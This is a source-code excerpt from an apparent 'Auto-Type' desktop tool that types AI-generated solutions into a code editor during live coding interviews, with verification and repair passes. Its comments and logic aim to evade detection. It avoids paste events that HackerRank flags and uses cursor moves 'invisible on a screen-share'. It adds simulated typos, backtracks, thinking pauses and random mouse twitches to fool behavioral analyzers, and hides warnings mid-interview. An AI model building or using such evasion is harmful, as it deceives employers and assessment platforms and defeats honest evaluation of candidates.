      // auto-rebuild here (the capped repair pass can't reconstruct a wiped
      // function, and firing a vision call would just burn Anthropic spend
      // for nothing) — we surface an actionable warning and let the user
      // retry. The real execution fix is Stage 2.
      let catastrophicCollapse = false;
      if (!autoTypeAbort) {
        const beforeNonWs = (uiaText || '').replace(/\s+/g, '').length;
        if (beforeNonWs > 40) {
          try {
            const collapseRead = await readFocusedViaUIA(1200);
            if (collapseRead && collapseRead.ok && typeof collapseRead.text === 'string'
                && !isUiaPlaceholderText(collapseRead.text)) {
              const afterNonWs = collapseRead.text.replace(/\s+/g, '').length;
              if (afterNonWs < beforeNonWs * 0.25) {
                catastrophicCollapse = true;
                console.error(`[auto-type] CATASTROPHIC COLLAPSE detected: editor non-whitespace fell ${beforeNonWs}→${afterNonWs} chars (<25% retained). Execution failed (keystrokes likely swallowed by the editor). NOT reporting success.`);
                autoTypePlanLog.record(_atRunId, { catastrophicCollapse: true, beforeNonWs, afterNonWs });
                autoTypeBroadcast({
                  phase: 'verify-mismatch',
                  reason: 'catastrophic_collapse',
                  beforeNonWs,
                  afterNonWs,
                  hint: 'Auto-Type may have failed — the editor lost most of its content (it likely intercepted the keystrokes). Check the code and retry; if it repeats, type the remaining lines manually.',
                });
              }
            }
          } catch (_) { /* collapse read failed — fall through to normal verify */ }
        }
      }

      // ── P5c + P5d: Multi-op post-verify with ACTIVE REPAIR iteration ──
      // 1) Verify each non-delete op's text appears in the editor.
      // 2) If any op is missing → REPAIR: take a fresh screenshot + UIA
      //    text, call the vision agent again, get a small fix plan,
      //    execute it. This is the "human re-reads and fixes" step.
      // 3) Re-verify after repair. Only broadcast a user-visible mismatch
      //    toast if a substantial fraction of ops are STILL missing AFTER
      //    the repair attempt — that's a true catastrophic failure.
      if (!autoTypeAbort && !catastrophicCollapse) {
        try {
          const vRes = await autoTypeVerifyMultiOp(multiOpPlan, { keyboard, Key });
          const totalOps = multiOpPlan.length;
          if (vRes.ok) {
            console.log(`[auto-type] multi-op verify: ALL OPS PRESENT in editor (${totalOps} op(s) checked)`);
            // P11-4/5: even when verify passes, run a surgical bracket
            // balance check. Catches the user's "comment delete ate a `}`"
            // scenario where verify substring-check would pass but the
            // editor is left syntactically broken. Silent if balanced.
            try {
              const brRes = await autoTypeSurgicalBracketRepair(code, language, { keyboard, Key });
              if (brRes.ok && brRes.repairs > 0) {
                console.log(`[auto-type] surgical bracket repair applied ${brRes.repairs} fix(es) post-verify`);
              }
            } catch (_) {}

            // P5d Part 1: per-op verify passed — but did we cover the WHOLE
            // target solution? The planner can UNDER-PLAN (never emit an op
            // for a chunk) or the executor can silently drop one; per-op
            // verify is blind to both because every op it DID emit is
            // present. Coverage answers the complementary question: are all
            // the meaningful lines of CODE_TO_TYPE actually in the editor?
            // GATE: reliable UIA only (non-browser + multi-line read).
            // Browser-hosted Monaco/CodeMirror expose only the scrolled-
            // visible region via UIA, so most of the target would look
            // "missing" and we'd false-trigger every run. A gap fires the
            // SAME completeness-aware repair as the missing-op path — so
            // this is detection, not a new always-on cost (the success case
            // has full coverage → no repair → no extra spend). We log the
            // outcome but still broadcast verify-ok: a coverage false alarm
            // must never surface as a scary toast mid-interview.
            try {
              const covBrowserHosted = /(^|\b)(chrome|msedge|edge|firefox|brave|opera|vivaldi|arc)(\b|$)/i.test(String(uiaProcName || ''));
              const covText = typeof vRes.afterText === 'string' ? vRes.afterText : '';
              const covReliable = !covBrowserHosted && covText.split('\n').length > 1;
              if (covReliable) {
                const gaps = computeCoverageGaps(code, covText);
                if (shouldTriggerRepair(gaps)) {
                  const eg = gaps.missingLines[0] ? gaps.missingLines[0].stripped.slice(0, 50) : '';
                  console.log(`[auto-type] COVERAGE GAP: ${gaps.missingLines.length}/${gaps.meaningfulTotal} target line(s) absent despite all ops verifying (ratio=${gaps.coverageRatio.toFixed(2)}) — e.g. "${eg}". Firing completeness repair…`);
                  autoTypePlanLog.record(_atRunId, { coverageGap: { missing: gaps.missingLines.length, meaningfulTotal: gaps.meaningfulTotal, ratio: gaps.coverageRatio } });
                  const covRepair = await autoTypeMultiOpRepair(code, language, authToken, API_BASE, { keyboard, Key, mouse, uiaText, processName: uiaProcName });
                  console.log(`[auto-type] COVERAGE repair: ${covRepair.ok ? `${covRepair.repairs || 0} op(s)` : 'failed'} (${covRepair.reason || 'ok'})`);
                }
              }
            } catch (covErr) {
              console.warn('[auto-type] coverage check threw (non-fatal):', covErr && covErr.message);
            }

            // ── Indentation ──
            // The two checks above both strip whitespace before comparing,
            // so a correctly-worded but wrongly-indented answer reaches
            // here as a clean pass. In Java that is untidy; in Python it is
            // a file that does not run, reported as success.
            //
            // The repair already ran inline, per block, while that block's
            // document lines were still known (autoTypeFixIndentation). All
            // that is left here is telling the user about anything it could
            // not fix or deliberately refused to touch.
            let indentWarning = null;
            try {
              if (result && result.indentRepairs > 0) {
                console.log(`[auto-type] indent: retyped ${result.indentRepairs} line(s) that landed off-shape`);
                autoTypePlanLog.record(_atRunId, { indentRepairs: result.indentRepairs });
              }
              const left = (result && result.indentUnfixed) || [];
              if (left.length) {
                const worst = left[0];
                indentWarning = left.some(m => m.tabMix)
                  ? `Tabs and spaces are mixed in the typed code (e.g. "${worst.line}") — in Python that will not run. Check the indentation before you submit.`
                  : `${left.length} line(s) landed at a different indent than intended (e.g. "${worst.line}" — expected ${worst.expected} spaces, got ${worst.actual}). Check the indentation before you submit.`;
                console.warn(`[auto-type] INDENT: ${left.length} line(s) still off-shape after repair — ${worst.line}`);
                autoTypePlanLog.record(_atRunId, { indentUnfixed: left.length });
              }
            } catch (indErr) {
              console.warn('[auto-type] indent report threw (non-fatal):', indErr && indErr.message);
            }

            if (indentWarning) {
              // Deliberately the SAME surface as a verify mismatch: the
              // code is all there, but it needs your eyes before you
              // submit — which is exactly what verify-mismatch means.
              // `hint` at the top level — that is the field the renderer
              // reads (App.tsx verify-mismatch handler); nesting it under a
              // `diagnostic` object would broadcast into a void.
              autoTypeBroadcast({ phase: 'verify-mismatch', reason: 'indent', hint: indentWarning });
            } else {
              autoTypeBroadcast({ phase: 'verify-ok', reason: 'multi_op_all_present' });
            }
          } else if (vRes.missingOps && vRes.missingOps.length > 0) {
            const summary = vRes.missingOps
              .map(m => `${m.op} L${m.start_line}: "${m.textPreview}…"`)
              .join('; ');
            console.log(`[auto-type] multi-op verify: ${vRes.missingOps.length}/${totalOps} op(s) missing after initial typing — ${summary}. Attempting REPAIR iteration…`);

            const repairRes = await autoTypeMultiOpRepair(code, language, authToken, API_BASE, { keyboard, Key, mouse, uiaText, processName: uiaProcName });

            if (repairRes.ok && repairRes.repairs > 0) {
              console.log(`[auto-type] REPAIR applied ${repairRes.repairs}/${repairRes.totalAttempted} fix op(s); re-verifying…`);
              const vRes2 = await autoTypeVerifyMultiOp(multiOpPlan, { keyboard, Key });
              if (vRes2.ok) {
                console.log(`[auto-type] multi-op verify (post-repair): ALL OPS PRESENT — silent verify-ok`);
                autoTypeBroadcast({ phase: 'verify-ok', reason: 'repaired', repairs: repairRes.repairs });
              } else {
                const stillMissing = vRes2.missingOps.length;
                const stillRatio = stillMissing / totalOps;
                if (stillRatio >= 0.7) {
                  console.warn(`[auto-type] multi-op verify (post-repair): STILL ${stillMissing}/${totalOps} missing — broadcast mismatch`);
                  autoTypeBroadcast({
                    phase: 'verify-mismatch',
                    reason: 'multi_op_missing_after_repair',
                    missingCount: stillMissing,
                    totalOps,
                    missingOps: vRes2.missingOps,
                  });
                } else {
                  console.log(`[auto-type] multi-op verify (post-repair): ${stillMissing}/${totalOps} still missing but below 70% threshold — broadcast verify-ok with note`);
                  autoTypeBroadcast({
                    phase: 'verify-ok',
                    reason: 'partially_repaired',
                    repairs: repairRes.repairs,
                    minorMissingCount: stillMissing,
                  });
                }
              }
            } else if (repairRes.ok && repairRes.repairs === 0) {
              // Vision said "nothing more to fix" — editor IS correct,
              // our per-op substring verify was just too strict (likely
              // IDE auto-formatting / whitespace differences vision can
              // see are fine but our string-strip didn't catch).
              console.log(`[auto-type] REPAIR vision pass says editor is already correct (${repairRes.reason}) — broadcast verify-ok`);
              autoTypeBroadcast({ phase: 'verify-ok', reason: 'vision_confirms_correct' });
            } else {
              // Repair couldn't run (no screenshot, no UIA, too many ops, etc).
              // Fall back to the loosened-threshold rule: only broadcast
              // mismatch when MOST ops are missing.
              const missingRatio = vRes.missingOps.length / totalOps;
              if (missingRatio >= 0.7) {
                console.warn(`[auto-type] multi-op verify: ${vRes.missingOps.length}/${totalOps} missing AND repair failed (${repairRes.reason}) — broadcast mismatch`);
                autoTypeBroadcast({
                  phase: 'verify-mismatch',
                  reason: 'multi_op_missing',
                  missingCount: vRes.missingOps.length,
                  totalOps,
                  missingOps: vRes.missingOps,
                  repairAttempt: repairRes.reason,
                });
              } else {
                console.log(`[auto-type] multi-op verify: ${vRes.missingOps.length}/${totalOps} missing (below 70%), repair unavailable (${repairRes.reason}) — broadcast verify-ok with minor drift note`);
                autoTypeBroadcast({
                  phase: 'verify-ok',
                  reason: 'multi_op_minor_drift',
                  minorMissingCount: vRes.missingOps.length,
                  repairAttempt: repairRes.reason,
                });
              }
            }
          } else {
            console.log(`[auto-type] multi-op verify: skipped (${vRes.reason || 'unknown'})`);
          }
        } catch (vErr) {
          console.warn('[auto-type] multi-op verify+repair threw (non-fatal):', vErr && vErr.message);
        }
      }
    } catch (err) {
      console.error('[auto-type] multi-op execution error:', err && err.message);
      if (!autoTypeAbortReason) {
        autoTypeAbortReason = 'multi_op_threw';
        autoTypeAbortDiagnostic = {
          hint: `Auto-Type stopped during a multi-step edit: ${err && err.message ? err.message : 'unknown'}. The editor may be partially edited — eyeball it before retrying.`,
        };
        autoTypeAbort = true;
      }
    } finally {
      // Before anything else: let go of every modifier. Each hold has its
      // own finally, but this run just ended for SOME reason and the one
      // state we must never hand back to the user is a stuck Shift or Ctrl.
      try { await releaseAllModifiers(); } catch (_) {}
      restore.forEach(fn => { try { fn(); } catch (_) {} });
      // Capture the AFTER state for the run log before broadcasting done.
      // Best-effort: a fresh UIA read shows the editor as it sits post-typing.
      // Skip if abort fired before any typing happened — afterText would just
      // duplicate beforeText.
      try {
        const _atAfter = await readFocusedViaUIA(1500);
        if (_atAfter && _atAfter.ok && typeof _atAfter.text === 'string') {
          autoTypePlanLog.record(_atRunId, { afterText: _atAfter.text, afterCursorOffset: _atAfter.cursorOffset });
        }
      } catch (_) { /* UIA unavailable post-run, leave afterText undefined */ }
      autoTypePlanLog.record(_atRunId, {
        path: 'multi-op',
        aborted: autoTypeAbort,
        abortReason: autoTypeAbortReason || null,
      });
      try { autoTypePlanLog.commit(_atRunId, app); } catch (_) {}
    autoTypeCurrentRunId = null;
      autoTypeBroadcast({
        phase: 'done',
        aborted: autoTypeAbort,
        reason: autoTypeAbortReason || undefined,
        hint: autoTypeAbortDiagnostic && autoTypeAbortDiagnostic.hint ? autoTypeAbortDiagnostic.hint : undefined,
      });
      autoTypeInFlight = false;
    }
    return { ok: !autoTypeAbort, aborted: autoTypeAbort, reason: autoTypeAbortReason || undefined };
  }

  autoTypeBroadcast({ phase: 'typing' });

  // `typedContent` is what we'll compare against in post-verify. It's the
  // slice of `code` we actually meant to type (after skipLines).
  let typedContent = '';

  try {
    const allLines = code.split('\n');
    // Skip leading lines (already present above cursor) and trailing lines
    // (already present below cursor — UIA only, OCR never produces trailing).
    // Clamp so over-matches don't produce a negative slice.
    const start = Math.min(effectiveSkipLines, allLines.length);
    const end = Math.max(start, allLines.length - effectiveSkipTrailing);
    const lines = allLines.slice(start, end);
    typedContent = lines.join('\n');
    if (effectiveSkipLines > 0 || effectiveSkipTrailing > 0) {
      console.log(`[auto-type] ${usedUIA ? 'UIA' : 'OCR'} skip: typing lines ${start + 1}..${end} of ${allLines.length} (leading=${effectiveSkipLines}, trailing=${effectiveSkipTrailing})`);
    }

    if (lines.length === 0) {
      // Everything matched on both ends — nothing left to type. Broadcast
      // a clean done so the UI flashes "Done" and exits. No keystrokes.
      console.log('[auto-type] nothing to type (all lines already present)');
      autoTypeBroadcast({ phase: 'typing' });
      autoTypeBroadcast({ phase: 'done', aborted: false });
      restore.forEach(fn => { try { fn(); } catch (_) {} });
      autoTypeInFlight = false;
      return { ok: true };
    }

    // ── Cursor positioning ──
    // 'use_current'   : cursor is already at the right spot — no-op.
    // 'move_relative' : VISION planner reposition — move the caret a
    //   signed number of lines from where the user dropped it, then snap
    //   to the target column. Pure counted arrow keys: invisible on a
    //   screen-share (no go-to-line widget, no scroll-to-top flash —
    //   indistinguishable from a human arrowing around), and the only
    //   cursor move that works identically across Monaco / CodeMirror /
    //   native inputs. THIS is what makes "drop the cursor anywhere and
    //   it goes to the right line itself" actually happen.
    // 'move_to_end'   : jump to end of file. Ctrl+End is universal.
    // 'go_to_line'    : legacy text-planner action — falls back to
    //   Ctrl+End (true Ctrl+G is editor-specific and the vision planner
    //   supersedes it with move_relative anyway).
    if (cursorAction === 'move_relative') {
      try {
        const delta = cursorLinesDelta;
        const vKey = delta < 0 ? Key.Up : Key.Down;
        const steps = Math.abs(delta);
        // P1a: dwell on each arrow. Previously 0ms — a counted run with no
        // dwell is the loudest possible nav-key fingerprint.
        for (let i = 0; i < steps; i++) {
          if (autoTypeAbort) break;
          await autoTypePressWithDwell(keyboard, vKey);
          await autoTypeNavSleep(12, 30);
        }
        await autoTypePressWithDwell(keyboard, Key.Home);
        await autoTypeNavSleep(10, 24);
        const col = Math.max(0, Math.min(400, cursorTargetColumn));
        for (let i = 0; i < col; i++) {
          if (autoTypeAbort) break;
          await autoTypePressWithDwell(keyboard, Key.Right);
          await autoTypeNavSleep(6, 16);
        }
        await autoTypeNavSleep(45, 88);
        console.log(`[auto-type] cursor: move_relative ${delta >= 0 ? '+' : ''}${delta} lines, then col ${col}`);
      } catch (kErr) {
        console.warn('[auto-type] cursor move_relative failed:', kErr && kErr.message);
      }
    } else if (cursorAction === 'go_to_line') {
      // Counted arrows from the top — invisible on screen-share, no Ctrl+G
      // widget, works across Monaco / CodeMirror / native inputs.
      // P1a: dwell on every key in the sequence (Home, Down loop, Home, Right loop).
      try {
        const target = Math.max(1, Math.min(100000, cursorTargetLine));
        await withHeldKey(keyboard, Key.LeftControl, async () => {
          await autoTypeNavSleep(5, 14);
          await autoTypePressWithDwell(keyboard, Key.Home);
          await autoTypeNavSleep(5, 14);
        });
        await autoTypeNavSleep(30, 60);
        await autoTypeArrowRun(keyboard, Key.Down, target - 1);
        // True column 0 before counting Rights — a single Home stops at the
        // first non-whitespace character in Monaco, which would make every
        // subsequent Right overshoot by the width of the indent.
        await autoTypeGoToColumnZero(keyboard, Key);
        const col = Math.max(0, Math.min(400, cursorTargetColumn));
        for (let i = 0; i < col; i++) {
          if (autoTypeAbort) break;
          await autoTypePressWithDwell(keyboard, Key.Right);
          await autoTypeNavSleep(6, 16);
        }
        console.log(`[auto-type] cursor: go_to_line ${target}:${col}`);
      } catch (kErr) {
        console.warn('[auto-type] cursor go_to_line failed:', kErr && kErr.message);
      }
    } else if (cursorAction === 'move_to_end') {
      try {
        await withHeldKey(keyboard, Key.LeftControl, async () => {
          await autoTypeNavSleep(5, 14);
          await autoTypePressWithDwell(keyboard, Key.End);
          await autoTypeNavSleep(5, 14);
        });
        await autoTypeNavSleep(45, 88);
        console.log(`[auto-type] cursor: moved to end-of-file via Ctrl+End`);
      } catch (kErr) {
        console.warn('[auto-type] cursor move failed:', kErr && kErr.message);
      }
    }

    // ── wipe_chars: backspace N chars to clear a partial token ──
    // Used when the editor has e.g. "def fac" and the code is "def factorial(...)";
    // wipe_chars=3 backspaces "fac", then we type the full identifier from scratch.
    if (wipeChars > 0) {
      try {
        for (let i = 0; i < wipeChars; i++) {
          if (autoTypeAbort) break;
          // P1a: dwell on each Backspace.
          await autoTypePressWithDwell(keyboard, Key.Backspace);
          await autoTypeNavSleep(5, 18);
        }
        console.log(`[auto-type] wiped ${wipeChars} chars before typing`);
      } catch (kErr) {
        console.warn('[auto-type] wipe_chars failed:', kErr && kErr.message);
      }
    }

    // ── prefix: tiny lead-in (usually "" or "\n") typed before main content ──
    if (typePrefix) {
      try {
        for (const ch of typePrefix) {
          if (autoTypeAbort) break;
          if (ch === '\n') {
            await autoTypePressWithDwell(keyboard, Key.Enter);
          } else {
            await typeCharHumanly(keyboard, Key, ch);
          }
          await autoTypeNavSleep(10, 26);
        }
      } catch (kErr) {
        console.warn('[auto-type] prefix type failed:', kErr && kErr.message);
      }
    }

    // First-line wipe: when leading skip > 0 the cursor sits on a whitespace
    // line whose content would stack with the typed line's own indent. Home
    // → Shift+End → Delete neutralizes the line before the first char lands.
    // Sequential key events (not a combo) because nut-js's combo form trips
    // libnut's "Invalid key flag" on some Windows builds.
    // P1a: dwell on Home, End, Delete.
    if (wipeFirstLine) {
      try {
        await autoTypePressWithDwell(keyboard, Key.Home);
        await autoTypeNavSleep(14, 32);
        await withHeldKey(keyboard, Key.LeftShift, async () => {
          await autoTypeNavSleep(5, 14);
          await autoTypePressWithDwell(keyboard, Key.End);
          await autoTypeNavSleep(5, 14);
        });
        await autoTypeNavSleep(14, 32);
        await autoTypePressWithDwell(keyboard, Key.Delete);
        await autoTypeNavSleep(22, 45);
      } catch (kErr) {
        // If the wipe fails, continue — worst case is visible double-indent
        // on the first typed line, not a broken type run.
        console.warn('[auto-type] first-line wipe failed:', kErr && kErr.message);
      }
    }

    // ── SID — Smart Interrupt Detection ──
    // Every N lines, do a quick UIA tail-read and compare against what we
    // expect to have typed. On drift (extra chars from accidental keystroke,
    // editor autocomplete intercept, focus loss), abort the typing run with
    // a clear "verify-mismatch" so the user can recover instead of letting
    // 50 more lines land in the wrong place. Cheap-ish (~150ms per check)
    // and only fires every 4 lines, so total slowdown is ~10-15% absorbed
    // mostly by the existing newline pause.
    //
    // Disabled when cursor_action='go_to_line' because computing the expected
    // editor state after a mid-file insertion is more involved than the
    // simple "typed text appended at end / at cursor" cases.
    //
    // ALSO disabled when effectiveSkipTrailing > 0 — the planner detected
    // template code BELOW our typed content (driver code, closing brackets).
    // SID's tail-comparison would look at that suffix instead of what we
    // typed and false-fire. This was the v3.4.3 regression that aborted
    // HackerRank typing after ~4 lines.
    //
    // SID_REQUIRED_DRIFT_HITS lets us tolerate a single transient mismatch
    // (UIA returning partial text mid-render, browser editor lagging) — only
    // abort when drift is detected on TWO consecutive checks.
    const SID_INTERVAL_LINES = 6;
    const SID_TAIL_CHARS = 60;
    const SID_REQUIRED_DRIFT_HITS = 2;
    const sidEnabled = uiaSnapshotBefore
      && (cursorAction === 'use_current' || cursorAction === 'move_to_end')
      && effectiveSkipTrailing === 0;
    let typedTailBuf = ''; // accumulates the last ~few-hundred chars we typed
    let linesSinceLastVerify = 0;
    let consecutiveDriftHits = 0; // resets on any successful verify

    let prevCh = null;
    // Track the last non-skipped line so we can tell "was the previous
    // line a block-opener?" even when the very first line types immediately
    // after a nav keystroke. Initially null — no block-opener context.
    let prevLineTextForBlockCheck = null;
    for (let li = 0; li < lines.length; li++) {
      if (autoTypeAbort) break;
      const line = lines[li];

      // Leading-indent analysis for the indent-mistake realism. Only triggers
      // when the previous line ended with a block-opener (`:` or `{`) AND
      // this line has enough indent for a "too short" mistake to be plausible.
      let indentEnd = 0;
      while (indentEnd < line.length && line[indentEnd] === ' ') indentEnd++;
      const prevEndsBlock = !!prevLineTextForBlockCheck &&
        /[:{]\s*$/.test(prevLineTextForBlockCheck);
      if (indentEnd > 0 && prevEndsBlock) {
        await autoTypeMaybeIndentMistake(keyboard, Key, indentEnd, true);
      }

      // Type characters one at a time so Monaco/CodeMirror treat each
      // as a real keystroke (not a paste event, which HackerRank flags).
      // autoTypeCharWithTypo occasionally mis-types + backspaces first —
      // a small realism tell that's hard to fake without actually doing it.
      //
      // We walk by index (not `for..of`) so word-level backtrack can scan
      // ahead for the full identifier and, if it fires, advance past the
      // whole word in one step.
      let ci = 0;
      while (ci < line.length) {
        if (autoTypeAbort) break;
        const ch = line[ci];

        // Decision-point pause BEFORE typing this char (if the (ch, prevCh)
        // pair qualifies). This is the "thinking beat" before `(`, `=`, `:`.
        const prePause = autoTypeDecisionPause(ch, prevCh);
        if (prePause > 0) await autoTypeSleep(prePause);

        // Word-level backtrack: at the start of an identifier, scan ahead
        // to the end of the word and offer it to the backtrack helper.
        // If the helper fires, the whole word is already typed (including
        // the mistake + correction) and we skip the per-char path for it.
        if (/[a-zA-Z_]/.test(ch) && (!prevCh || !/[a-zA-Z0-9_]/.test(prevCh))) {
          let wj = ci + 1;
          while (wj < line.length && /[a-zA-Z0-9_]/.test(line[wj])) wj++;
          const word = line.slice(ci, wj);
          const didBacktrack = await autoTypeMaybeBacktrackWord(keyboard, Key, word);
          if (didBacktrack) {
            prevCh = word[word.length - 1];
            ci = wj;
            continue;
          }
          // P5b: Autocomplete acceptance. ~22% of identifiers ≥6 chars get
          // partial-typed + Tab + UIA-verified. Saves keystrokes naturally.
          const didAutocomplete = await autoTypeMaybeAutocomplete(keyboard, Key, word, prevCh);
          if (didAutocomplete) {
            prevCh = word[word.length - 1];
            ci = wj;
            continue;
          }
        }

        try {
          await autoTypeCharWithTypo(keyboard, Key, ch, prevCh);
        } catch (chErr) {
          // Some layouts can't render certain chars via .type();
          // skip gracefully rather than aborting the whole block.
          console.warn('[auto-type] char skipped:', JSON.stringify(ch), chErr && chErr.message);
        }
        await autoTypeSleep(autoTypeHumanDelay(ch, prevCh));
        prevCh = ch;
        ci++;
      }

      if (li < lines.length - 1 && !autoTypeAbort) {
        // End-of-line review pause. Widen on "block boundary" moments —
        // blank next line, or clear outdent into a new top-level chunk.
        // Humans re-read before committing, and they re-read longer at
        // boundaries than inside a tight expression sequence.
        const nextLine = lines[li + 1] || '';
        let nextIndent = 0;
        while (nextIndent < nextLine.length && nextLine[nextIndent] === ' ') nextIndent++;
        const atBlockBoundary = nextLine.trim() === '' ||
          (indentEnd > 0 && nextLine.trim() !== '' && nextIndent < indentEnd);
        const dwell = atBlockBoundary
          ? 320 + Math.random() * 820
          : 250 + Math.random() * 450;
        await autoTypeSleep(dwell);

        // Optional mouse twitch during the inter-line pause. Fires every
        // 18–31 lines on a fresh schedule each time, so the cadence is
        // unpredictable. See autoTypeMaybeMouseTwitch for rationale —
        // long stretches of pure-keyboard activity are the strongest
        // signal that behavioral analyzers (Ropes-class) lock onto.
        if (mouse) {
          await autoTypeMaybeMouseTwitch(mouse);
        }

        // Same line break as the multi-op path — one shared implementation
        // so the two can't drift apart again. It replaces a predicate that
        // GUESSED whether the editor would auto-indent (`indentEnd > 0 ||
        // line ends with a block opener`) and only then wiped. The guess is
        // unnecessary: selecting the indent and typing over it is correct
        // whether or not the editor inserted one, and it never forward-
        // deletes the following line when the guess is wrong.
        try {
          await autoTypeLineBreak(keyboard, Key);
        } catch (kErr) {
          // If the line break fails, continue — worst case is
          // visible double-indent, not a broken type run.
          console.warn('[auto-type] line-break failed:', kErr && kErr.message);
        }

        // Reset prevCh at line boundaries so the first char of the new
        // line doesn't get "double letter" speed-up with the last char
        // of the previous line (which is visually a separate word).
        prevCh = null;
      }

      prevLineTextForBlockCheck = line;

      // SID: accumulate, then verify every N lines.
      if (sidEnabled) {
        typedTailBuf += line + (li < lines.length - 1 ? '\n' : '');
        // Cap at 4×TAIL so memory stays small but enough context for verify.
        if (typedTailBuf.length > SID_TAIL_CHARS * 4) {
          typedTailBuf = typedTailBuf.slice(-SID_TAIL_CHARS * 4);
        }
        linesSinceLastVerify++;
        if (linesSinceLastVerify >= SID_INTERVAL_LINES && typedTailBuf.length >= 8) {
          linesSinceLastVerify = 0;
          try {
            const uiaCheck = await readFocusedViaUIA(800);
            if (uiaCheck && uiaCheck.ok) {
              // Whitespace-tolerant comparison: take the last SID_TAIL_CHARS
              // non-whitespace chars we typed and search for them ANYWHERE in
              // the editor (not just the tail window — middle-of-file inserts
              // are valid). If our tail is missing → drift candidate.
              const stripWs = (s) => s.replace(/\s+/g, '');
              const wantTail = stripWs(typedTailBuf).slice(-SID_TAIL_CHARS);
              const actualNw = stripWs(uiaCheck.text || '');

              // ── UIA-blind safeguard ──
              // Browser-based editors (Monaco/CodeMirror in Chrome) sometimes
              // return only a partial slice of the editor text via UIA — or
              // nothing at all on a slow render. If what UIA gave us is
              // shorter than what we've typed, the comparison is unreliable;
              // skip rather than false-abort. We only have ground truth on
              // editors that expose their full content via UIA (native IDEs,
              // Notepad, electron-based editors with proper a11y).
              const minimumExpected = stripWs(typedTailBuf).length + 8;
              if (actualNw.length < minimumExpected) {
                console.log(`[auto-type] SID skip: UIA returned ${actualNw.length} chars but we've typed ${stripWs(typedTailBuf).length} — editor likely UIA-blind, trusting the type continues`);
                consecutiveDriftHits = 0;
              } else if (wantTail.length >= 8 && !actualNw.includes(wantTail)) {
                consecutiveDriftHits++;
                const expectedSnippet = wantTail.slice(-50);
                const actualSnippet = actualNw.slice(-100);
                console.warn(`[auto-type] SID drift candidate ${consecutiveDriftHits}/${SID_REQUIRED_DRIFT_HITS} after line ${li + 1} — typed tail not in editor`);
                console.warn(`[auto-type]   wanted: ${JSON.stringify(expectedSnippet)}`);
                console.warn(`[auto-type]   editor tail: ${JSON.stringify(actualSnippet)}`);
                if (consecutiveDriftHits >= SID_REQUIRED_DRIFT_HITS) {
                  autoTypeAbort = true;
                  autoTypeAbortReason = 'sid_drift_during_typing';
                  autoTypeAbortDiagnostic = {
                    expected: expectedSnippet,
                    actual: actualSnippet,
                    lineIndex: li + 1,
                    hint: 'Likely cause: editor lost focus, autocomplete inserted text, or you typed manually during the run. Try again with the editor focused and autocomplete off.',
                  };
                  autoTypeBroadcast({
                    phase: 'verify-mismatch',
                    reason: 'sid_drift_during_typing',
                    ratio: 0,
                    expected: expectedSnippet,
                    actual: actualSnippet,
                    lineIndex: li + 1,
                    hint: autoTypeAbortDiagnostic.hint,
                  });
                  break;
                }
              } else {
                // Successful verify — reset the consecutive-hit counter so a
                // single transient blip doesn't carry forward to the next.
                consecutiveDriftHits = 0;
              }
            }
          } catch (sidErr) {
            // Best-effort — never let SID itself break the typing run.
            console.warn('[auto-type] SID check failed (non-fatal):', sidErr && sidErr.message);
          }
        }
      }
    }

    // If the last line typed was empty, autoTypeLineBreak left the editor's
    // auto-indent selected. Collapse before anything else runs, so a stray
    // keystroke (or the suffix below) doesn't silently replace it.
    if (!autoTypeAbort) await autoTypeCollapseSelection(keyboard, Key);

    // ── suffix: tiny tail (usually closing brackets) typed after main content ──
    // P1a: dwell on Enter and each char.
    if (!autoTypeAbort && typeSuffix) {
      try {
        for (const ch of typeSuffix) {
          if (autoTypeAbort) break;
          if (ch === '\n') {
            await autoTypePressWithDwell(keyboard, Key.Enter);
          } else {
            await typeCharHumanly(keyboard, Key, ch);
          }
          await autoTypeNavSleep(10, 26);
        }
      } catch (kErr) {
        console.warn('[auto-type] suffix type failed:', kErr && kErr.message);
      }
    }

    // ── P5c: Post-type verify + active correction ──
    // First, try the ACTIVE corrector (autoTypeVerifyAndCorrect). If the
    // editor has most of our typed content + just a trailing tail missing
    // + cursor still in the right place, it appends the missing tail.
    // (Real coders re-read their code and fix small mistakes; this layer
    // gives the auto-typer the same self-correcting behavior.)
    // If active correction can't safely fix it, fall back to the legacy
    // verify path (verifyTypedContent + broadcast mismatch) so the user
    // gets a clear diagnostic instead of a silent wrong result.
    if (!autoTypeAbort && (usedUIA || aiPlanAccepted) && uiaSnapshotBefore) {
      try {
        const correctRes = await autoTypeVerifyAndCorrect(typedContent, { keyboard, Key });
        if (correctRes.ok) {
          if (correctRes.corrected > 0) {
            console.log(`[auto-type] verify+correct: appended ${correctRes.corrected} chars (${correctRes.reason})`);
            autoTypeBroadcast({ phase: 'verify-ok', reason: 'corrected', corrected: correctRes.corrected });
          } else {
            console.log(`[auto-type] verify: ok (${correctRes.reason})`);
            autoTypeBroadcast({ phase: 'verify-ok', reason: correctRes.reason });
          }
        } else {
          // Active correction couldn't safely fix. Fall back to legacy
          // verify so we at least surface a clear mismatch to the user.
          const uiaAfter = await readFocusedViaUIA(1200);
          if (uiaAfter && uiaAfter.ok) {
            const verdict = verifyTypedContent(typedContent, uiaAfter.text || '');
            console.warn(`[auto-type] verify: ${verdict.ok ? 'ok' : 'mismatch'} (correct-attempt=${correctRes.reason}, legacy-ratio=${(verdict.ratio || 0).toFixed(2)}, legacy-reason=${verdict.reason})`);
            if (verdict.ok) {
              autoTypeBroadcast({ phase: 'verify-ok', reason: verdict.reason });
            } else {
              autoTypeBroadcast({
                phase: 'verify-mismatch',
                ratio: verdict.ratio,
                reason: verdict.reason,
                correctReason: correctRes.reason,
              });
            }
          } else {
            console.log(`[auto-type] verify: inconclusive (correct-attempt=${correctRes.reason}, legacy-uia=unavailable)`);
          }
        }
      } catch (vErr) {
        console.warn('[auto-type] verify+correct error (non-fatal):', vErr && vErr.message);
      }
    }
  } catch (err) {
    console.error('[auto-type] typing loop error:', err);
    if (!autoTypeAbortReason) {
      autoTypeAbortReason = 'typing_loop_threw';
      autoTypeAbortDiagnostic = {
        hint: `Auto-Type stopped because of an internal error: ${err && err.message ? err.message : 'unknown'}. If this keeps happening, restart the app.`,
      };
      autoTypeAbort = true;
    }
  } finally {
    // Same sweep as the multi-op path above, for the same reason — this is
    // the last code that runs before the user gets their keyboard back.
    try { await releaseAllModifiers(); } catch (_) {}
    restore.forEach(fn => { try { fn(); } catch (_) {} });
    // Capture the AFTER state for the single-region path's run log.
    try {
      const _atAfter = await readFocusedViaUIA(1500);
      if (_atAfter && _atAfter.ok && typeof _atAfter.text === 'string') {
        autoTypePlanLog.record(_atRunId, { afterText: _atAfter.text, afterCursorOffset: _atAfter.cursorOffset });
      }
    } catch (_) { /* UIA unavailable post-run */ }
